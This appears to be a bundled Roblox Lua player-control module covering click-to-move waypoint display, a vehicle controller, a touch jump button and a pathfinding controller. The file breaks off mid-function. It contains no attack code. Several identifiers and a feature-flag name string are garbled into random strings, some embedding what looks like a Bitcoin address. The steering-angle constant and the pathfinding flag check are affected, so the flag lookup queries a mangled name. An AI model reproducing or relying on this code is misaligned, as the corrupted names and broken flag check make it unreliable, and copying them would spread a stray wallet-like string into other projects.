	function ClickToMoveDisplay.CreateEndWaypoint(position)
		return EndWaypoint.new(position)
	end
	
	function ClickToMoveDisplay.PlayFailureAnimation()
		local myHumanoid = findPlayerHumanoid()
		if myHumanoid then
			local animationTrack = getFailureAnimationTrack(myHumanoid)
			animationTrack:Play()
		end
	end
	
	function ClickToMoveDisplay.CancelFailureAnimation()
		if lastFailureAnimationTrack ~= nil and lastFailureAnimationTrack.IsPlaying then
			lastFailureAnimationTrack:Stop()
		end
	end
	
	function ClickToMoveDisplay.SetWaypointTexture(texture)
		TrailDotIcon = texture
		TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
	end
	
	function ClickToMoveDisplay.GetWaypointTexture()
		return TrailDotIcon
	end
	
	function ClickToMoveDisplay.SetWaypointRadius(radius)
		TrailDotSize = Vector2.new(radius, radius)
		TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
	end
	
	function ClickToMoveDisplay.GetWaypointRadius()
		return TrailDotSize.X
	end
	
	function ClickToMoveDisplay.SetEndWaypointTexture(texture)
		EndWaypointIcon = texture
		TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
	end
	
	function ClickToMoveDisplay.GetEndWaypointTexture()
		return EndWaypointIcon
	end
	
	function ClickToMoveDisplay.SetWaypointsAlwaysOnTop(alwaysOnTop)
		WaypointsAlwaysOnTop = alwaysOnTop
		TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
	end
	
	function ClickToMoveDisplay.GetWaypointsAlwaysOnTop()
		return WaypointsAlwaysOnTop
	end
	
	return ClickToMoveDisplay
end

function _BaseCharacterController()

	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	
	--[[ The Module ]]--
	local BaseCharacterController = {}
	BaseCharacterController.__index = BaseCharacterController
	
	function BaseCharacterController.new()
		local self = setmetatable({}, BaseCharacterController)
		self.enabled = false
		self.moveVector = ZERO_VECTOR3
		self.moveVectorIsCameraRelative = true
		self.isJumping = false
		return self
	end
	
	function BaseCharacterController:OnRenderStepped(dt)
		-- By default, nothing to do
	end
	
	function BaseCharacterController:GetMoveVector()
		return self.moveVector
	end
	
	function BaseCharacterController:IsMoveVectorCameraRelative()
		return self.moveVectorIsCameraRelative
	end
	
	function BaseCharacterController:GetIsJumping()
		return self.isJumping
	end
	
	-- Override in derived classes to set self.enabled and return boolean indicating
	-- whether Enable/Disable was successful. Return true if controller is already in the requested state.
	function BaseCharacterController:Enable(enable)
		error("BaseCharacterController:Enable must be overridden in derived classes and should not be called.")
		return false
	end
	
	return BaseCharacterController
end

function _VehicleController()
	local ContextActionService = game:GetService("ContextActionService")
	
	--[[ Constants ]]--
	-- Set this to true if you want to instead use the triggers for the throttle
	local useTriggersForThrottle = true
	-- Also set this to true if you want the thumbstick to not affect throttle, only triggers when a gamepad is conected
	local onlyTriggersForThrottle = false
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	
	local GLzbc1qcqwjujg2h3dp3n9k0fa6ysset8u87xr95x547u = 35
	
	
	-- Note that VehicleController does not derive from BaseCharacterController, it is a special case
	local VehicleController = {}
	VehicleController.__index = VehicleController
	
	function VehicleController.new(CONTROL_ACTION_PRIORITY)
		local self = setmetatable({}, VehicleController)
	
		self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY
	
		self.enabled = false
		self.vehicleSeat = nil
		self.throttle = 0
		self.steer = 0
	
		self.acceleration = 0
		self.decceleration = 0
		self.turningRight = 0
		self.turningLeft = 0
	
		self.vehicleMoveVector = ZERO_VECTOR3
	
		self.autoPilot = {}
		self.autoPilot.MaxSpeed = 0
		self.autoPilot.MaxSteeringAngle = 0
	
		return self
	end
	
	function VehicleController:BindContextActions()
		if useTriggersForThrottle then
			ContextActionService:BindActionAtPriority("throttleAccel", (function(actionName, inputState, inputObject)
				self:OnThrottleAccel(actionName, inputState, inputObject)
				return Enum.ContextActionResult.Pass
			end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonR2)
			ContextActionService:BindActionAtPriority("throttleDeccel", (function(actionName, inputState, inputObject)
				self:OnThrottleDeccel(actionName, inputState, inputObject)
				return Enum.ContextActionResult.Pass
			end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonL2)
		end
		ContextActionService:BindActionAtPriority("arrowSteerRight", (function(actionName, inputState, inputObject)
			self:OnSteerRight(actionName, inputState, inputObject)
			return Enum.ContextActionResult.Pass
		end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Right)
		ContextActionService:BindActionAtPriority("arrowSteerLeft", (function(actionName, inputState, inputObject)
			self:OnSteerLeft(actionName, inputState, inputObject)
			return Enum.ContextActionResult.Pass
		end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Left)
	end
	
	function VehicleController:Enable(enable, vehicleSeat)
		if enable == self.enabled and vehicleSeat == self.vehicleSeat then
			return
		end
	
		self.enabled = enable
		self.vehicleMoveVector = ZERO_VECTOR3
	
		if enable then
			if vehicleSeat then
				self.vehicleSeat = vehicleSeat
	
				self:SetupAutoPilot()
				self:BindContextActions()
			end
		else
			if useTriggersForThrottle then
				ContextActionService:UnbindAction("throttleAccel")
				ContextActionService:UnbindAction("throttleDeccel")
			end
			ContextActionService:UnbindAction("arrowSteerRight")
			ContextActionService:UnbindAction("arrowSteerLeft")
			self.vehicleSeat = nil
		end
	end
	
	function VehicleController:OnThrottleAccel(actionName, inputState, inputObject)
		if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
			self.acceleration = 0
		else
			self.acceleration = -1
		end
		self.throttle = self.acceleration + self.decceleration
	end
	
	function VehicleController:OnThrottleDeccel(actionName, inputState, inputObject)
		if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
			self.decceleration = 0
		else
			self.decceleration = 1
		end
		self.throttle = self.acceleration + self.decceleration
	end
	
	function VehicleController:OnSteerRight(actionName, inputState, inputObject)
		if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
			self.turningRight = 0
		else
			self.turningRight = 1
		end
		self.steer = self.turningRight + self.turningLeft
	end
	
	function VehicleController:OnSteerLeft(actionName, inputState, inputObject)
		if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
			self.turningLeft = 0
		else
			self.turningLeft = -1
		end
		self.steer = self.turningRight + self.turningLeft
	end
	
	-- Call this from a function bound to Renderstep with Input Priority
	function VehicleController:Update(moveVector, cameraRelative, usingGamepad)
		if self.vehicleSeat then
			if cameraRelative then
				-- This is the default steering mode
				moveVector = moveVector + Vector3.new(self.steer, 0, self.throttle)
				if usingGamepad and onlyTriggersForThrottle and useTriggersForThrottle then
					self.vehicleSeat.ThrottleFloat = -self.throttle
				else
					self.vehicleSeat.ThrottleFloat = -moveVector.Z
				end
				self.vehicleSeat.SteerFloat = moveVector.X
	
				return moveVector, true
			else
				-- This is the path following mode
				local localMoveVector = self.vehicleSeat.Occupant.RootPart.CFrame:VectorToObjectSpace(moveVector)
	
				self.vehicleSeat.ThrottleFloat = self:ComputeThrottle(localMoveVector)
				self.vehicleSeat.SteerFloat = self:ComputeSteer(localMoveVector)
	
				return ZERO_VECTOR3, true
			end
		end
		return moveVector, false
	end
	
	function VehicleController:ComputeThrottle(localMoveVector)
		if localMoveVector ~= ZERO_VECTOR3 then
			local throttle = -localMoveVector.Z
			return throttle
		else
			return 0.0
		end
	end
	
	function VehicleController:ComputeSteer(localMoveVector)
		if localMoveVector ~= ZERO_VECTOR3 then
			local steerAngle = -math.atan2(-localMoveVector.x, -localMoveVector.z) * (180 / math.pi)
			return steerAngle / self.autoPilot.MaxSteeringAngle
		else
			return 0.0
		end
	end
	
	function VehicleController:SetupAutoPilot()
		-- Setup default
		self.autoPilot.MaxSpeed = self.vehicleSeat.MaxSpeed
		self.autoPilot.MaxSteeringAngle = GLzbc1qcqwjujg2h3dp3n9k0fa6ysset8u87xr95x547u
	
		-- VehicleSeat should have a MaxSteeringAngle as well.
		-- Or we could look for a child "AutoPilotConfigModule" to find these values
		-- Or allow developer to set them through the API as like the CLickToMove customization API
	end
	
	return VehicleController
end

function _TouchJump()
	
	local Players = game:GetService("Players")
	local GuiService = game:GetService("GuiService")
	
	--[[ Constants ]]--
	local TOUCH_CONTROL_SHEET = "rbxasset://textures/ui/Input/TouchControlsSheetV2.png"
	
	--[[ The Module ]]--
	local BaseCharacterController = _BaseCharacterController()
	local TouchJump = setmetatable({}, BaseCharacterController)
	TouchJump.__index = TouchJump
	
	function TouchJump.new()
		local self = setmetatable(BaseCharacterController.new(), TouchJump)
	
		self.parentUIFrame = nil
		self.jumpButton = nil
		self.characterAddedConn = nil
		self.humanoidStateEnabledChangedConn = nil
		self.humanoidJumpPowerConn = nil
		self.humanoidParentConn = nil
		self.externallyEnabled = false
		self.jumpPower = 0
		self.jumpStateEnabled = true
		self.isJumping = false
		self.humanoid = nil -- saved reference because property change connections are made using it
	
		return self
	end
	
	function TouchJump:EnableButton(enable)
		if enable then
			if not self.jumpButton then
				self:Create()
			end
			local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			if humanoid and self.externallyEnabled then
				if self.externallyEnabled then
					if humanoid.JumpPower > 0 then
						self.jumpButton.Visible = true
					end
				end
			end
		else
			self.jumpButton.Visible = false
			self.isJumping = false
			self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
		end
	end
	
	function TouchJump:UpdateEnabled()
		if self.jumpPower > 0 and self.jumpStateEnabled then
			self:EnableButton(true)
		else
			self:EnableButton(false)
		end
	end
	
	function TouchJump:HumanoidChanged(prop)
		local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			if prop == "JumpPower" then
				self.jumpPower =  humanoid.JumpPower
				self:UpdateEnabled()
			elseif prop == "Parent" then
				if not humanoid.Parent then
					self.humanoidChangeConn:Disconnect()
				end
			end
		end
	end
	
	function TouchJump:HumanoidStateEnabledChanged(state, isEnabled)
		if state == Enum.HumanoidStateType.Jumping then
			self.jumpStateEnabled = isEnabled
			self:UpdateEnabled()
		end
	end
	
	function TouchJump:CharacterAdded(char)
		if self.humanoidChangeConn then
			self.humanoidChangeConn:Disconnect()
			self.humanoidChangeConn = nil
		end
	
		self.humanoid = char:FindFirstChildOfClass("Humanoid")
		while not self.humanoid do
			char.ChildAdded:wait()
			self.humanoid = char:FindFirstChildOfClass("Humanoid")
		end
	
		self.humanoidJumpPowerConn = self.humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
			self.jumpPower =  self.humanoid.JumpPower
			self:UpdateEnabled()
		end)
	
		self.humanoidParentConn = self.humanoid:GetPropertyChangedSignal("Parent"):Connect(function()
			if not self.humanoid.Parent then
				self.humanoidJumpPowerConn:Disconnect()
				self.humanoidJumpPowerConn = nil
				self.humanoidParentConn:Disconnect()
				self.humanoidParentConn = nil
			end
		end)
	
		self.humanoidStateEnabledChangedConn = self.humanoid.StateEnabledChanged:Connect(function(state, enabled)
			self:HumanoidStateEnabledChanged(state, enabled)
		end)
	
		self.jumpPower = self.humanoid.JumpPower
		self.jumpStateEnabled = self.humanoid:GetStateEnabled(Enum.HumanoidStateType.Jumping)
		self:UpdateEnabled()
	end
	
	function TouchJump:SetupCharacterAddedFunction()
		self.characterAddedConn = Players.LocalPlayer.CharacterAdded:Connect(function(char)
			self:CharacterAdded(char)
		end)
		if Players.LocalPlayer.Character then
			self:CharacterAdded(Players.LocalPlayer.Character)
		end
	end
	
	function TouchJump:Enable(enable, parentFrame)
		if parentFrame then
			self.parentUIFrame = parentFrame
		end
		self.externallyEnabled = enable
		self:EnableButton(enable)
	end
	
	function TouchJump:Create()
		if not self.parentUIFrame then
			return
		end
	
		if self.jumpButton then
			self.jumpButton:Destroy()
			self.jumpButton = nil
		end
	
		local minAxis = math.min(self.parentUIFrame.AbsoluteSize.x, self.parentUIFrame.AbsoluteSize.y)
		local isSmallScreen = minAxis <= 500
		local jumpButtonSize = isSmallScreen and 70 or 120
	
		self.jumpButton = Instance.new("ImageButton")
		self.jumpButton.Name = "JumpButton"
		self.jumpButton.Visible = false
		self.jumpButton.BackgroundTransparency = 1
		self.jumpButton.Image = TOUCH_CONTROL_SHEET
		self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
		self.jumpButton.ImageRectSize = Vector2.new(144, 144)
		self.jumpButton.Size = UDim2.new(0, jumpButtonSize, 0, jumpButtonSize)
	
	    self.jumpButton.Position = isSmallScreen and UDim2.new(1, -(jumpButtonSize*1.5-10), 1, -jumpButtonSize - 20) or
	        UDim2.new(1, -(jumpButtonSize*1.5-10), 1, -jumpButtonSize * 1.75)
	
		local touchObject = nil
		self.jumpButton.InputBegan:connect(function(inputObject)
			--A touch that starts elsewhere on the screen will be sent to a frame's InputBegan event
			--if it moves over the frame. So we check that this is actually a new touch (inputObject.UserInputState ~= Enum.UserInputState.Begin)
			if touchObject or inputObject.UserInputType ~= Enum.UserInputType.Touch
				or inputObject.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
	
			touchObject = inputObject
			self.jumpButton.ImageRectOffset = Vector2.new(146, 146)
			self.isJumping = true
		end)
	
		local OnInputEnded = function()
			touchObject = nil
			self.isJumping = false
			self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
		end
	
		self.jumpButton.InputEnded:connect(function(inputObject)
			if inputObject == touchObject then
				OnInputEnded()
			end
		end)
	
		GuiService.MenuOpened:connect(function()
			if touchObject then
				OnInputEnded()
			end
		end)
	
		if not self.characterAddedConn then
			self:SetupCharacterAddedFunction()
		end
	
		self.jumpButton.Parent = self.parentUIFrame
	end
	
	return TouchJump
end

function _ClickToMoveController()
	--[[ Roblox Services ]]--
	local UserInputService = game:GetService("UserInputService")
	local PathfindingService = game:GetService("PathfindingService")
	local Players = game:GetService("Players")
	local DebrisService = game:GetService('Debris')
	local StarterGui = game:GetService("StarterGui")
	local Workspace = game:GetService("Workspace")
	local CollectionService = game:GetService("CollectionService")
	local GuiService = game:GetService("GuiService")
	
	--[[ Configuration ]]
	local ShowPath = true
	local PlayFailureAnimation = true
	local UseDirectPath = false
	local UseDirectPathForVehicle = true
	local AgentSizeIncreaseFactor = 1.0
	local UnreachableWaypointTimeout = 8
	
	--[[ Constants ]]--
	local movementKeys = {
		[Enum.KeyCode.W] = true;
		[Enum.KeyCode.A] = true;
		[Enum.KeyCode.S] = true;
		[Enum.KeyCode.D] = true;
		[Enum.KeyCode.Up] = true;
		[Enum.KeyCode.Down] = true;
	}
	
	local FFlagUserhXwTBw2EjaJJLgeXLfQYCL5dTb6sbs2uV9zhQUkGWzXzeRsxTfTaeaf, FFlagUserhXgV4njk8ubc1qcqwjujg2h3dp3n9k0fa6ysset8u87xr95x547ult = pcall(function() return UserSettings():IsUserFeatureEnabled("UserhXwTBw2EjaJJMy9vvYExau1mRNSRiro1H8Coints") end)
	local FFlagUserhXwTBw2EjaJJMy9vvYExau1mRNSRiro1H8Coints = FFlagUserhXwTBw2EjaJJLgeXLfQYCL5dTb6sbs2uV9zhQUkGWzXzeRsxTfTaeaf and FFlagUserhXgV4njk8ubc1qcqwjujg2h3dp3n9k0fa6ysset8u87xr95x547ult
	
	local Player = Players.LocalPlayer
	
	local ClickToMoveDisplay = _ClickToMoveDisplay()
	
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	local ALMOST_ZERO = 0.000001
	
	
	--------------------------UTIL LIBRARY-------------------------------
	local Utility = {}
	do
		local function FindCharacterAncestor(part)
			if part then
				local humanoid = part:FindFirstChildOfClass("Humanoid")
				if humanoid then
					return part, humanoid
				else
					return FindCharacterAncestor(part.Parent)
				end
			end
		end
		Utility.FindCharacterAncestor = FindCharacterAncestor
	
		local function Raycast(ray, ignoreNonCollidable, ignoreList)
			ignoreList = ignoreList or {}
			local hitPart, hitPos, hitNorm, hitMat = Workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
			if hitPart then
				if ignoreNonCollidable and hitPart.CanCollide == false then
					-- We always include character parts so a user can click on another character
					-- to walk to them.
					local _, humanoid = FindCharacterAncestor(hitPart)
					if humanoid == nil then
						table.insert(ignoreList, hitPart)
						return Raycast(ray, ignoreNonCollidable, ignoreList)
					end
				end
				return hitPart, hitPos, hitNorm, hitMat
			end
			return nil, nil
		end
		Utility.Raycast = Raycast
	end
	
	local humanoidCache = {}
	local function findPlayerHumanoid(player)
		local character = player and player.Character
		if character then
			local resultHumanoid = humanoidCache[player]
			if resultHumanoid and resultHumanoid.Parent == character then
				return resultHumanoid
			else
				humanoidCache[player] = nil -- Bust Old Cache
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoidCache[player] = humanoid
				end
				return humanoid
			end
		end
	end
	
	--------------------------CHARACTER CONTROL-------------------------------
	local CurrentIgnoreList
	local CurrentIgnoreTag = nil
	
	local TaggedInstanceAddedConnection = nil
	local TaggedInstanceRemovedConnection = nil
	
	local function GetCharacter()
		return Player and Player.Character
	end
	
	local function UpdateIgnoreTag(newIgnoreTag)
		if newIgnoreTag == CurrentIgnoreTag then
			return
		end
		if TaggedInstanceAddedConnection then
			TaggedInstanceAddedConnection:Disconnect()
			TaggedInstanceAddedConnection = nil
		end
		if TaggedInstanceRemovedConnection then
			TaggedInstanceRemovedConnection:Disconnect()
			TaggedInstanceRemovedConnection = nil
		end
		CurrentIgnoreTag = newIgnoreTag
		CurrentIgnoreList = {GetCharacter()}
		if CurrentIgnoreTag ~= nil then
			local ignoreParts = CollectionService:GetTagged(CurrentIgnoreTag)
			for _, ignorePart in ipairs(ignoreParts) do
				table.insert(CurrentIgnoreList, ignorePart)
			end
			TaggedInstanceAddedConnection = CollectionService:GetInstanceAddedSignal(
				CurrentIgnoreTag):Connect(function(ignorePart)
				table.insert(CurrentIgnoreList, ignorePart)
			end)
			TaggedInstanceRemovedConnection = CollectionService:GetInstanceRemovedSignal(
				CurrentIgnoreTag):Connect(function(ignorePart)
				for i = 1, #CurrentIgnoreList do
					if CurrentIgnoreList[i] == ignorePart then
						CurrentIgnoreList[i] = CurrentIgnoreList[#CurrentIgnoreList]
						table.remove(CurrentIgnoreList)
						break
					end
				end
			end)
		end
	end
	
	local function getIgnoreList()
		if CurrentIgnoreList then
			return CurrentIgnoreList
		end
		CurrentIgnoreList = {}
		table.insert(CurrentIgnoreList, GetCharacter())
		return CurrentIgnoreList
	end
	
	-----------------------------------PATHER--------------------------------------
	
	local function Pather(endPoint, surfaceNormal, overrideUseDirectPath)
		local this = {}
	
		local directPathForHumanoid
		local directPathForVehicle
		if overrideUseDirectPath ~= nil then
			directPathForHumanoid = overrideUseDirectPath
			directPathForVehicle = overrideUseDirectPath
		else
			directPathForHumanoid = UseDirectPath
			directPathForVehicle = UseDirectPathForVehicle
		end
	
		this.Cancelled = false
		this.Started = false
	
		this.Finished = Instance.new("BindableEvent")
		this.PathFailed = Instance.new("BindableEvent")
	
		this.PathComputing = false
		this.PathComputed = false
	
		this.OriginalTargetPoint = endPoint
		this.TargetPoint = endPoint
		this.TargetSurfaceNormal = surfaceNormal
	
		this.DiedConn = nil
		this.SeatedConn = nil
		this.BlockedConn = nil
		this.TeleportedConn = nil
	
		this.CurrentPoint = 0
	
		this.HumanoidOffsetFromPath = ZERO_VECTOR3
	
		this.CurrentWaypointPosition = nil
		this.CurrentWaypointPlaneNormal = ZERO_VECTOR3
		this.CurrentWaypointPlaneDistance = 0
		this.CurrentWaypointNeedsJump = false;
	
		this.CurrentHumanoidPosition = ZERO_VECTOR3
		this.CurrentHumanoidVelocity = 0
	
		this.NextActionMoveDirection = ZERO_VECTOR3
		this.NextActionJump = false
	
		this.Timeout = 0
	
		this.Humanoid = findPlayerHumanoid(Player)
		this.OriginPoint = nil
		this.AgentCanFollowPath = false
		this.DirectPath = false
		this.DirectPathRiseFirst = false
	
		local rootPart = this.Humanoid and this.Humanoid.RootPart
		if rootPart then
			-- Setup origin
			this.OriginPoint = rootPart.CFrame.p
	
			-- Setup agent
			local agentRadius = 2
			local agentHeight = 5
			local agentCanJump = true
	
			local seat = this.Humanoid.SeatPart
			if seat and seat:IsA("VehicleSeat") then
				-- Humanoid is seated on a vehicle
				local vehicle = seat:FindFirstAncestorOfClass("Model")
				if vehicle then
					-- Make sure the PrimaryPart is set to the vehicle seat while we compute the extends.
					local tempPrimaryPart = vehicle.PrimaryPart
					vehicle.PrimaryPart = seat
	
					-- For now, only direct path
					if directPathForVehicle then
						local extents = vehicle:GetExtentsSize()
						agentRadius = AgentSizeIncreaseFactor * 0.5 * math.sqrt(extents.X * extents.X + extents.Z * extents.Z)
						agentHeight = AgentSizeIncreaseFactor * extents.Y
						agentCanJump = false
						this.AgentCanFollowPath = true
						this.DirectPath = directPathForVehicle
					end
	
					-- Reset PrimaryPart
					vehicle.PrimaryPart = tempPrimaryPart
				end
			else
				local extents = GetCharacter():GetExtentsSize()
				agentRadius = AgentSizeIncreaseFactor * 0.5 * math.sqrt(extents.X * extents.X + extents.Z * extents.Z)
				agentHeight = AgentSizeIncreaseFactor * extents.Y
				agentCanJump = (this.Humanoid.JumpPower > 0)
				this.AgentCanFollowPath = true
				this.DirectPath = directPathForHumanoid
				this.DirectPathRiseFirst = this.Humanoid.Sit
			end
	
			-- Build path object
			this.pathResult = PathfindingService:CreatePath({AgentRadius = agentRadius, AgentHeight = agentHeight, AgentCanJump = agentCanJump})
		end
	
		function this:Cleanup()
			if this.stopTraverseFunc then
				this.stopTraverseFunc()
				this.stopTraverseFunc = nil
			end
	
			if this.MoveToConn then
				this.MoveToConn:Disconnect()
				this.MoveToConn = nil
			end
	
			if this.BlockedConn then
				this.BlockedConn:Disconnect()
				this.BlockedConn = nil
			end
	
			if this.DiedConn then
				this.DiedConn:Disconnect()
				this.DiedConn = nil
			end
	
			if this.SeatedConn then
				this.SeatedConn:Disconnect()
				this.SeatedConn = nil
			end
	
			if this.TeleportedConn then
				this.TeleportedConn:Disconnect()
				this.TeleportedConn = nil
			end
	
			this.Started = false
		end
	
		function this:Cancel()
			this.Cancelled = true
			this:Cleanup()
		end
	
		function this:IsActive()
			return this.AgentCanFollowPath and this.Started and not this.Cancelled
		end
	
		function this:OnPathInterrupted()
			-- Stop moving
			this.Cancelled = true
			this:OnPointReached(false)
		end
	
		function this:ComputePath()
			if this.OriginPoint then
				if this.PathComputed or this.PathComputing then return end
				this.PathComputing = true
				if this.AgentCanFollowPath then
					if this.DirectPath then
						this.pointList = {
							PathWaypoint.new(this.OriginPoint, Enum.PathWaypointAction.Walk),
							PathWaypoint.new(this.TargetPoint, this.DirectPathRiseFirst and Enum.PathWaypointAction.Jump or Enum.PathWaypointAction.Walk)
						}
						this.PathComputed = true
					else
						this.pathResult:ComputeAsync(this.OriginPoint, this.TargetPoint)
						this.pointList = this.pathResult:GetWaypoints()
						this.BlockedConn = this.pathResult.Blocked:Connect(function(blockedIdx) this:OnPathBlocked(blockedIdx) end)
						this.PathComputed = this.pathResult.Status == Enum.PathStatus.Success
					end
				end
				this.PathComputing = false
			end
		end
	
		function this:IsValidPath()
			this:ComputePath()
			return this.PathComputed and this.AgentCanFollowPath
		end
	
		this.Recomputing = false
		function this:OnPathBlocked(blockedWaypointIdx)
			local pathBlocked = blockedWaypointIdx >= this.CurrentPoint
			if not pathBlocked or this.Recomputing then
				return
			end
	
			this.Recomputing = true
	
			if this.stopTraverseFunc then
				this.stopTraverseFunc()
				this.stopTraverseFunc = nil
			end
	
			this.OriginPoint = this.Humanoid.RootPart.CFrame.p
	
			this.pathResult:ComputeAsync(this.OriginPoint, this.TargetPoint)
			this.pointList = this.pathResult:GetWaypoints()
			if #this.pointList > 0 then
				this.HumanoidOffsetFromPath = this.pointList[1].Position - this.OriginPoint
			end
			this.PathComputed = this.pathResult.Status == Enum.PathStatus.Success
	
			if ShowPath then
				this.stopTraverseFunc, this.setPointFunc = ClickToMoveDisplay.CreatePathDisplay(this.pointList)
			end
			if this.PathComputed then
				this.CurrentPoint = 1 -- The first waypoint is always the start location. Skip it.
				this:OnPointReached(true) -- Move to first point
			else
				this.PathFailed:Fire()
				this:Cleanup()
			end
	
			this.Recomputing = false
		end
	
		function this:OnRenderStepped(dt)
			if this.Started and not this.Cancelled then
				-- Check for Timeout (if a waypoint is not reached within the delay, we fail)
				this.Timeout = this.Timeout + dt
				if this.Timeout > UnreachableWaypointTimeout then
					this:OnPointReached(false)
					return
				end
	
				-- Get Humanoid position and velocity
				this.CurrentHumanoidPosition = this.Humanoid.RootPart.Position + this.HumanoidOffsetFromPath
				this.CurrentHumanoidVelocity = this.Humanoid.RootPart.Velocity
	
				-- Check if it has reached some waypoints
				while this.Started and this:IsCurrentWaypointReached() do
					this:OnPointReached(true)
				end
	
				-- If still started, update actions
				if this.Started then
					-- Move action
					this.NextActionMoveDirection = this.CurrentWaypointPosition - this.CurrentHumanoidPosition
					if this.NextActionMoveDirection.Magnitude > ALMOST_ZERO then
						this.NextActionMoveDirection = this.NextActionMoveDirection.Unit
					else
						this.NextActionMoveDirection = ZERO_VECTOR3
					end
					-- Jump action
					if this.CurrentWaypointNeedsJump then
						this.NextActionJump = true
						this.CurrentWaypointNeedsJump = false	-- Request jump only once
					else
						this.NextActionJump = false
					end
				end
			end
		end
	
		function this:IsCurrentWaypointReached()
			local reached = false
	
			-- Check we do have a plane, if not, we consider the waypoint reached
			if this.CurrentWaypointPlaneNormal ~= ZERO_VECTOR3 then
				-- Compute distance of Humanoid from destination plane
				local dist = this.CurrentWaypointPlaneNormal:Dot(this.CurrentHumanoidPosition) - this.CurrentWaypointPlaneDistance
				-- Compute the component of the Humanoid velocity that is towards the plane
				local velocity = -this.CurrentWaypointPlaneNormal:Dot(this.CurrentHumanoidVelocity)
				-- Compute the threshold from the destination plane based on Humanoid velocity
				local threshold = math.max(1.0, 0.0625 * velocity)
				-- If we are less then threshold in front of the plane (between 0 and threshold) or if we are behing the plane (less then 0), we consider we reached it
				reached = dist < threshold
			else
				reached = true
			end
	
			if reached then
				this.CurrentWaypointPosition = nil
				this.CurrentWaypointPlaneNormal	= ZERO_VECTOR3
				this.CurrentWaypointPlaneDistance = 0
			end
	
			return reached
		end
	
		function this:OnPointReached(reached)
	
			if reached and not this.Cancelled then
				-- First, destroyed the current displayed waypoint
				if this.setPointFunc then
					this.setPointFunc(this.CurrentPoint)
				end
	
				local nextWaypointIdx = this.CurrentPoint + 1
	
				if nextWaypointIdx > #this.pointList then
					-- End of path reached
					if this.stopTraverseFunc then
						this.stopTraverseFunc()
					end
					this.Finished:Fire()
					this:Cleanup()
				else
					local currentWaypoint = this.pointList[this.CurrentPoint]
					local nextWaypoint = this.pointList[nextWaypointIdx]
	
					-- If airborne, only allow to keep moving
					-- if nextWaypoint.Action ~= Jump, or path mantains a direction
					-- Otherwise, wait until the humanoid gets to the ground
					local currentState = this.Humanoid:GetState()
					local isInAir = currentState == Enum.HumanoidStateType.FallingDown
						or currentState == Enum.HumanoidStateType.Freefall
						or currentState == Enum.HumanoidStateType.Jumping
	
					if isInAir then
						local shouldWaitForGround = nextWaypoint.Action == Enum.PathWaypointAction.Jump
						if not shouldWaitForGround and this.CurrentPoint > 1 then
							local prevWaypoint = this.pointList[this.CurrentPoint - 1]
	
							local prevDir = currentWaypoint.Position - prevWaypoint.Position
							local currDir = nextWaypoint.Position - currentWaypoint.Position
	
							local prevDirXZ = Vector2.new(prevDir.x, prevDir.z).Unit
							local currDirXZ = Vector2.new(currDir.x, currDir.z).Unit
	
							local THRESHOLD_COS = 0.996 -- ~cos(5 degrees)
							shouldWaitForGround = prevDirXZ:Dot(currDirXZ) < THRESHOLD_COS
						end
	
						if shouldWaitForGround then
							this.Humanoid.FreeFalling:Wait()
	
							-- Give time to the humanoid's state to change
							-- Otherwise, the jump flag in Humanoid
							-- will be reset by the state change
							wait(0.1)
						end
					end
	
					-- Move to the next point
					if FFlagUserhXwTBw2EjaJJMy9vvYExau1mRNSRiro1H8Coints then
						this:MoveToNextWayPoint(currentWaypoint, nextWaypoint, nextWaypointIdx)
					else
						if this.setPointFunc then
							this.setPointFunc(nextWaypointIdx)
						end
						if nextWaypoint.Action == Enum.PathWaypointAction.Jump then
							this.Humanoid.Jump = true
						end
						this.Humanoid:MoveTo(nextWaypoint.Position)
	
						this.CurrentPoint = nextWaypointIdx
					end
				end
			else
				this.PathFailed:Fire()
				this:Cleanup()
			end
		end
	
		function this:MoveToNextWayPoint(currentWaypoint, nextWaypoint, nextWaypointIdx)
			-- Build next destination plane
			-- (plane normal is perpendicular to the y plane and is from next waypoint towards current one (provided the two waypoints are not at the same location))
			-- (plane location is at next waypoint)
			this.CurrentWaypointPlaneNormal = currentWaypoint.Position - nextWaypoint.Position
			this.CurrentWaypointPlaneNormal = Vector3.new(this.CurrentWaypointPlaneNormal.X, 0, this.CurrentWaypointPlaneNormal.Z)
			if this.CurrentWaypointPlaneNormal.Magnitude > ALMOST_ZERO then
				this.CurrentWaypointPlaneNormal	= this.CurrentWaypointPlaneNormal.Unit
				this.CurrentWaypointPlaneDistance = this.CurrentWaypointPlaneNormal:Dot(nextWaypoint.Position)
			else
				-- Next waypoint is the same as current waypoint so no plane
				this.CurrentWaypointPlaneNormal	= ZERO_VECTOR3
				this.CurrentWaypointPlaneDistance = 0
			end
	
			-- Should we jump
			this.CurrentWaypointNeedsJump = nextWaypoint.Action == Enum.PathWaypointAction.Jump;
	
			-- Remember next waypoint position
			this.CurrentWaypointPosition = nextWaypoint.Position
	
			-- Move to next point
			this.CurrentPoint = nextWaypointIdx
	
			-- Finally reset Timeout
			this.Timeout = 0
		end
	
		function this:Start(overrideShowPath)
